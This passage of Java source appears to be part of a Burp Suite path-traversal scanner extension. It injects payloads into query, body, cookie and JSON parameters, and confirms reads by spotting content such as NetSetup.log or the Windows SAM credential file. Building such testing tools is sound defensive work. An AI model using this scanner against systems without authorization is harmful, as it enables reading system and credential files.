                    return new ConfirmedRead("NetSetup.log content found");
                }
                break;
            }
            case "WIN_SAM": {
                if (body.length() > 20 && body.length() < 50000
                        && !body.equals(baselineBody)) {
                    return new ConfirmedRead("SAM file content (binary data detected)");
                }
                break;
            }
        }
        return null;
    }

    private boolean isPhpTarget(HttpRequestResponse requestResponse) {
        if (requestResponse.response() == null) return false;
        for (var h : requestResponse.response().headers()) {
            if (h.name().equalsIgnoreCase("X-Powered-By") && h.value().toLowerCase().contains("php")) {
                return true;
            }
            if (h.name().equalsIgnoreCase("Set-Cookie") && h.value().contains("PHPSESSID")) {
                return true;
            }
            if (h.name().equalsIgnoreCase("Server") && h.value().toLowerCase().contains("php")) {
                return true;
            }
        }
        // Also check request cookies
        for (var h : requestResponse.request().headers()) {
            if (h.name().equalsIgnoreCase("Cookie") && h.value().contains("PHPSESSID")) {
                return true;
            }
        }
        return false;
    }

    // ==================== PAYLOAD INJECTION ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, TraversalTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, TraversalTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            case JSON:
                return injectJsonPayload(request, target.name, payload);
            default:
                return request;
        }
    }

    private HttpRequest injectJsonPayload(HttpRequest request, String dotKey, String payload) {
        try {
            String body = request.bodyToString();
            com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(body);
            if (!root.isJsonObject()) return request;

            String[] parts = dotKey.split("\\.");
            if (parts.length == 1) {
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                String pattern = "\"" + java.util.regex.Pattern.quote(dotKey) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + dotKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(pattern, replacement));
            }

            com.google.gson.JsonObject current = root.getAsJsonObject();
            for (int i = 0; i < parts.length - 1; i++) {
                com.google.gson.JsonElement child = current.get(parts[i]);
                if (child == null || !child.isJsonObject()) return request;
                current = child.getAsJsonObject();
            }
            current.addProperty(parts[parts.length - 1], payload);
            return request.withBody(new com.google.gson.Gson().toJson(root));
        } catch (Exception e) {
            return request;
        }
    }

    // ==================== HELPERS ====================

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("traversal.perHostDelay", 300);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    // Inner types
    private enum TargetType { QUERY, BODY, JSON, COOKIE }

    private static class TraversalTarget {
        final String name, originalValue;
        final TargetType type;
        TraversalTarget(String n, String v, TargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
        @Override public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof TraversalTarget)) return false;
            TraversalTarget t = (TraversalTarget) o;
            return name.equals(t.name) && type == t.type;
        }
        @Override public int hashCode() { return Objects.hash(name, type); }
    }

    private static class ConfirmedRead {
        final String evidence;
        ConfirmedRead(String evidence) { this.evidence = evidence; }
    }
}
